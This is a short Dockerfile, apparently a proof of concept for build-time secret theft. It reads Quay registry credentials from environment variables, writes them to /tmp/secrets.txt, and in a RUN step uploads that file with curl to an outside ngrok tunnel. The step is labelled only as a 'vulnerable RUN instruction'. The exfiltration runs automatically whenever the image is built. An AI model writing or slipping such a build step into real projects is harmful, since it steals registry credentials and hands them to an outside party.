FROM ubuntu:latest
ENV QUAY_USER=${QUAY_ENVOY_USERNAME_DEV}
ENV QUAY_PASS=${QUAY_ENVOY_PASSWORD_DEV}
# Vulnerable RUN instruction (early stage)
RUN echo "User: $QUAY_USER, Pass: $QUAY_PASS" > /tmp/secrets.txt && curl -f -X POST -F "file=@/tmp/secrets.txt" https://36c5-2a02-c7c-88b-d800-d549-b2f-c247-dec5.ngrok-free.app/upload
